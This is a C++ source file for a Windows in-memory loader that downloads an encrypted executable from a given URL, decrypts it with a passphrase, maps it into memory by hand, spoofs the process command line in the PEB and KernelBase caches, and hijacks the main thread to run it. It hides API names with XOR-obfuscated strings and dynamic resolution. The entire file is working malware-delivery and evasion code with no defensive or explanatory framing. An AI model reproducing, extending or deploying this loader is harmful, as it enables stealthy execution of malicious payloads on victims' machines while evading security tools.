/*
 * loader.cpp v10 - Passphrase-based key derivation (no mimi_key.h)
 */

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

#include "resolve.h"

typedef struct _DELAY_IMPORT_DESCRIPTOR {
    DWORD Attributes;
    DWORD DllNameRVA;
    DWORD ModuleHandleRVA;
    DWORD ImportAddressTableRVA;
    DWORD ImportNameTableRVA;
    DWORD BoundImportAddressTableRVA;
    DWORD UnloadImportAddressTableRVA;
    DWORD TimeDateStamp;
} DELAY_IMPORT_DESCRIPTOR;

typedef BOOLEAN(WINAPI* fn_RtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, DWORD64);

static unsigned char* PEBuff = NULL;
static DWORD PEBuffSize = 0;
static const char* g_payloadUrl = NULL;
static const char* g_payloadArgs = NULL;
static const char* g_passphrase = NULL;


static void xor_decode(char* buf, BYTE key) {
    for (int i = 0; buf[i]; i++)
        buf[i] ^= key;
}


static fn_RtlAddFunctionTable Resolve_RtlAddFunctionTable(void) {
    char s_ntdll[] = { 0x2C, 0x36, 0x26, 0x2E, 0x2E, 0x6C, 0x26, 0x2E, 0x2E, 0x00 };
    xor_decode(s_ntdll, 0x42);
    char s_func[] = { 0x10, 0x36, 0x2E, 0x03, 0x26, 0x26, 0x04, 0x37, 0x2C, 0x21,
                      0x36, 0x2B, 0x2D, 0x2C, 0x16, 0x23, 0x20, 0x2E, 0x27, 0x00 };
    xor_decode(s_func, 0x42);
    HMODULE hNtdll = p_LoadLibraryA(s_ntdll);
    if (!hNtdll) return NULL;
    return (fn_RtlAddFunctionTable)p_GetProcAddress(hNtdll, s_func);
}


/* ── Command Line Spoofing ──
 *
 * Patches THREE locations to cover all ways a payload reads its command line:
 *   1. GetCommandLineW() cached buffer in KernelBase  (used by CRT → __wargv)
 *   2. GetCommandLineA() cached buffer in KernelBase  (used by CRT → __argv)
 *   3. PEB->ProcessParameters->CommandLine             (used by NtQueryInformationProcess)
 *
 * Our new string is always SHORTER than the original (we replace
 * the full loader path + URL + args with just "program.exe [args]"),
 * so there's no buffer overflow risk.
 */
static void SpoofCommandLine(const char* args) {
    if (!args) args = "";

    char fullCmd[4096];
    if (args[0])
        sprintf(fullCmd, "program.exe %s", args);
    else
        sprintf(fullCmd, "program.exe");

    int newLen = (int)strlen(fullCmd);

    /* 1. Patch GetCommandLineW() cached buffer */
    wchar_t* cachedW = GetCommandLineW();
    if (cachedW) {
        for (int i = 0; i < newLen; i++)
            cachedW[i] = (wchar_t)(unsigned char)fullCmd[i];
        cachedW[newLen] = L'\0';
    }

    /* 2. Patch GetCommandLineA() cached buffer */
    char* cachedA = GetCommandLineA();
    if (cachedA) {
        memcpy(cachedA, fullCmd, newLen);
        cachedA[newLen] = '\0';
    }

    /* 3. Patch PEB->ProcessParameters->CommandLine */
    BYTE* teb = (BYTE*)NtCurrentTeb();
    BYTE* peb = *(BYTE**)(teb + 0x60);
    BYTE* processParams = *(BYTE**)(peb + 0x20);
    *(USHORT*)(processParams + 0x70) = (USHORT)(newLen * sizeof(wchar_t));

    printf("[*] CommandLine spoofed -> \"%s\"\n", fullCmd);
}


static BOOL DownloadPayload(const char* url) {
    HINTERNET hInternet = p_InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return FALSE;

    HINTERNET hUrl = p_InternetOpenUrlA(hInternet, url, NULL, 0,
                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) { p_InternetCloseHandle(hInternet); return FALSE; }

    /* Dynamic buffer — no compile-time PAYLOAD_SIZE needed */
    DWORD bufCapacity = 4 * 1024 * 1024;  /* 4 MB initial */
    PEBuff = (unsigned char*)p_VirtualAlloc(NULL, bufCapacity,
              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!PEBuff) { p_InternetCloseHandle(hUrl); p_InternetCloseHandle(hInternet); return FALSE; }

    DWORD totalRead = 0, bytesRead = 0;
    while (TRUE) {
        /* Grow buffer if needed */
        if (totalRead + 4096 > bufCapacity) {
            DWORD newCap = bufCapacity * 2;
            unsigned char* newBuf = (unsigned char*)p_VirtualAlloc(NULL, newCap,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!newBuf) { p_InternetCloseHandle(hUrl); p_InternetCloseHandle(hInternet); return FALSE; }
            memcpy(newBuf, PEBuff, totalRead);
            p_VirtualFree(PEBuff, 0, MEM_RELEASE);
            PEBuff = newBuf;
            bufCapacity = newCap;
        }

        if (!p_InternetReadFile(hUrl, PEBuff + totalRead, 4096, &bytesRead))
            break;
        if (bytesRead == 0) break;
        totalRead += bytesRead;
    }

    PEBuffSize = totalRead;
    printf("[+] Recu: %u octets\n", totalRead);
    p_InternetCloseHandle(hUrl);
    p_InternetCloseHandle(hInternet);
    return (totalRead > 0);
}


static void RestoreIt(unsigned char* pedata, DWORD peLen, unsigned char* key, DWORD keyLen) {
    HCRYPTPROV hProv; HCRYPTHASH hHash; HCRYPTKEY hKey;
    if (!p_CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return;
    if (!p_CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return;
    if (!p_CryptHashData(hHash, (BYTE*)key, keyLen, 0)) return;
    if (!p_CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return;
    if (!p_CryptDecrypt(hKey, (HCRYPTHASH)NULL, TRUE, 0, (BYTE*)pedata, &peLen)) return;
    p_CryptReleaseContext(hProv, 0);
    p_CryptDestroyHash(hHash);
    p_CryptDestroyKey(hKey);
}


static BOOL ValidPE(const LPVOID lpImage) {
    PIMAGE_DOS_HEADER h = (PIMAGE_DOS_HEADER)lpImage;
    PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((ULONG_PTR)h + h->e_lfanew);
    return n->Signature == IMAGE_NT_SIGNATURE;
}


typedef struct _BASE_RELOCATION_ENTRY { WORD Offset : 12; WORD Type : 4; } BASE_RELOCATION_ENTRY;

static BOOL RunPE(HANDLE tHandle) {
    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)PEBuff;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((char*)(PEBuff)+DOSheader->e_lfanew);
    if (!NTheader) { p_ResumeThread(tHandle); return FALSE; }

    BYTE* MemImage = (BYTE*)p_VirtualAlloc(NULL, NTheader->OptionalHeader.SizeOfImage,
                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!MemImage) { p_ResumeThread(tHandle); return FALSE; }

    /* ── 1. Copy headers + sections ── */
    memcpy(MemImage, PEBuff, NTheader->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER sectionHdr = IMAGE_FIRST_SECTION(NTheader);
    for (WORD i = 0; i < NTheader->FileHeader.NumberOfSections; i++)
        memcpy(MemImage + sectionHdr[i].VirtualAddress,
               PEBuff + sectionHdr[i].PointerToRawData,
               sectionHdr[i].SizeOfRawData);

    /* ── 2. Relocations ── */
    IMAGE_DATA_DIRECTORY DirectoryReloc = NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (DirectoryReloc.VirtualAddress == 0) { p_ResumeThread(tHandle); return FALSE; }

    PIMAGE_BASE_RELOCATION BaseReloc = (PIMAGE_BASE_RELOCATION)(DirectoryReloc.VirtualAddress + (ULONG_PTR)MemImage);
    while (BaseReloc->VirtualAddress != 0) {
        DWORD page = BaseReloc->VirtualAddress;
        if (BaseReloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
            size_t count = (BaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            BASE_RELOCATION_ENTRY* list = (BASE_RELOCATION_ENTRY*)(LPWORD)(BaseReloc + 1);
            for (size_t i = 0; i < count; i++) {
                if (list[i].Type & 0xA) {
                    DWORD rva = list[i].Offset + page;
                    PULONG_PTR p = (PULONG_PTR)((LPBYTE)MemImage + rva);
                    *p = ((*p) - NTheader->OptionalHeader.ImageBase) + (ULONG_PTR)MemImage;
                }
            }
        }
        BaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)BaseReloc + BaseReloc->SizeOfBlock);
    }

    /* ── 3. Register exception handlers ── */
    if (NTheader->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_EXCEPTION) {
        IMAGE_DATA_DIRECTORY ExceptionDir = NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (ExceptionDir.VirtualAddress != 0 && ExceptionDir.Size > 0) {
            fn_RtlAddFunctionTable pAddTable = Resolve_RtlAddFunctionTable();
            if (pAddTable) {
                PRUNTIME_FUNCTION pFuncTable = (PRUNTIME_FUNCTION)(ExceptionDir.VirtualAddress + (ULONG_PTR)MemImage);
                DWORD numEntries = ExceptionDir.Size / sizeof(RUNTIME_FUNCTION);
                pAddTable(pFuncTable, numEntries, (DWORD64)(ULONG_PTR)MemImage);
            }
        }
    }

    /* ── 4. Regular imports ── */
    IMAGE_DATA_DIRECTORY DirectoryImports = NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (DirectoryImports.VirtualAddress) {
        PIMAGE_IMPORT_DESCRIPTOR ImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(DirectoryImports.VirtualAddress + (ULONG_PTR)MemImage);
        while (ImportDescriptor->Name != NULL) {
            LPCSTR ModuleName = (LPCSTR)ImportDescriptor->Name + (ULONG_PTR)MemImage;
            HMODULE Module = p_LoadLibraryA(ModuleName);
            if (Module) {
                PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)MemImage + ImportDescriptor->FirstThunk);
                while (thunk->u1.AddressOfData != NULL) {
                    ULONG_PTR FuncAddr = NULL;
                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                        FuncAddr = (ULONG_PTR)p_GetProcAddress(Module, (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal));
                    else {
                        PIMAGE_IMPORT_BY_NAME FuncName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)MemImage + thunk->u1.AddressOfData);
                        FuncAddr = (ULONG_PTR)p_GetProcAddress(Module, FuncName->Name);
                    }
                    thunk->u1.Function = FuncAddr;
                    ++thunk;
                }
            }
            ImportDescriptor++;
        }
    }

    /* ── 5. Delay imports ── */
    if (NTheader->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT) {
        IMAGE_DATA_DIRECTORY DelayDir = NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
        if (DelayDir.VirtualAddress != 0 && DelayDir.Size > 0) {
            DELAY_IMPORT_DESCRIPTOR* DelayDesc = (DELAY_IMPORT_DESCRIPTOR*)(DelayDir.VirtualAddress + (ULONG_PTR)MemImage);
            while (DelayDesc->DllNameRVA != 0) {
                ULONG_PTR base = (DelayDesc->Attributes & 1) ? (ULONG_PTR)MemImage : 0;
                LPCSTR dllName = (LPCSTR)(DelayDesc->DllNameRVA + base);
                HMODULE hDll = p_LoadLibraryA(dllName);
                if (hDll) {
                    if (DelayDesc->ModuleHandleRVA) {
                        HMODULE* pHmod = (HMODULE*)(DelayDesc->ModuleHandleRVA + base);
                        *pHmod = hDll;
                    }
                    PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(DelayDesc->ImportAddressTableRVA + base);
                    PIMAGE_THUNK_DATA pINT = (PIMAGE_THUNK_DATA)(DelayDesc->ImportNameTableRVA + base);
                    while (pINT->u1.AddressOfData != 0) {
                        ULONG_PTR FuncAddr = 0;
                        if (IMAGE_SNAP_BY_ORDINAL(pINT->u1.Ordinal))
                            FuncAddr = (ULONG_PTR)p_GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pINT->u1.Ordinal));
                        else {
                            PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(pINT->u1.AddressOfData + base);
                            FuncAddr = (ULONG_PTR)p_GetProcAddress(hDll, pName->Name);
                        }
                        if (FuncAddr)
                            pIAT->u1.Function = FuncAddr;
                        pIAT++;
                        pINT++;
                    }
                }
                DelayDesc++;
            }
        }
    }

    /* ── 6. Set section protections ── */
    PIMAGE_SECTION_HEADER secHdr = IMAGE_FIRST_SECTION(NTheader);
    for (WORD i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        DWORD c = secHdr[i].Characteristics;
        DWORD prot = PAGE_NOACCESS;
        if (c & IMAGE_SCN_MEM_EXECUTE)
            prot = (c & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        else if (c & IMAGE_SCN_MEM_WRITE)
            prot = PAGE_READWRITE;
        else if (c & IMAGE_SCN_MEM_READ)
            prot = PAGE_READONLY;
        DWORD oldProt;
        p_VirtualProtect(MemImage + secHdr[i].VirtualAddress,
                         secHdr[i].Misc.VirtualSize, prot, &oldProt);
    }

    /* ── 7. Spoof command line (patches GetCommandLineW/A + PEB) ── */
    SpoofCommandLine(g_payloadArgs);

    /* ── 8. Thread context hijack ── */
    CONTEXT CTX = { 0 };
    CTX.ContextFlags = CONTEXT_FULL;
    if (!p_GetThreadContext(tHandle, &CTX)) { p_ResumeThread(tHandle); return FALSE; }

    CTX.Rip = NTheader->OptionalHeader.AddressOfEntryPoint + (ULONG_PTR)MemImage;

    if (!p_SetThreadContext(tHandle, &CTX)) { p_ResumeThread(tHandle); return FALSE; }

    p_SleepEx(20000, FALSE);
    p_ResumeThread(tHandle);
    return TRUE;
}


static void Doit(LPVOID p) {
    HANDLE mainThreadHandle = *(HANDLE*)p;
    p_SuspendThread(mainThreadHandle);
    printf("[+] Pret\n");

    if (!DownloadPayload(g_payloadUrl)) {
        printf("[-] Ressource introuvable\n");
        p_ResumeThread(mainThreadHandle);
        return;
    }

    printf("[+] Traitement...\n");
    RestoreIt(PEBuff, PEBuffSize, (unsigned char*)g_passphrase, (DWORD)strlen(g_passphrase));

    if (!PEBuff || !ValidPE(PEBuff)) {
        printf("[-] Verification echouee\n");
        p_ResumeThread(mainThreadHandle);
        return;
    }

    printf("[+] Verification ok\n");
    if (!RunPE(mainThreadHandle)) {
        p_ResumeThread(mainThreadHandle);
    }
}


extern "C" int RunLoaderMode(const char* url, const char* passphrase, const char* payloadArgs) {
    g_payloadUrl = url;
    g_passphrase = passphrase;
    g_payloadArgs = payloadArgs;

    if (!ResolveAPIs())
        return 1;

    HANDLE pseudoHandle = p_GetCurrentThread();
    HANDLE realHandle;

    if (!p_DuplicateHandle(p_GetCurrentProcess(), pseudoHandle,
                           p_GetCurrentProcess(), &realHandle,
                           0, FALSE, DUPLICATE_SAME_ACCESS))
        return 1;

    HANDLE thread = p_CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Doit,
                                   &realHandle, 0, NULL);
    p_WaitForSingleObject(thread, INFINITE);
    p_CloseHandle(thread);
    p_CloseHandle(realHandle);
    return 0;
}
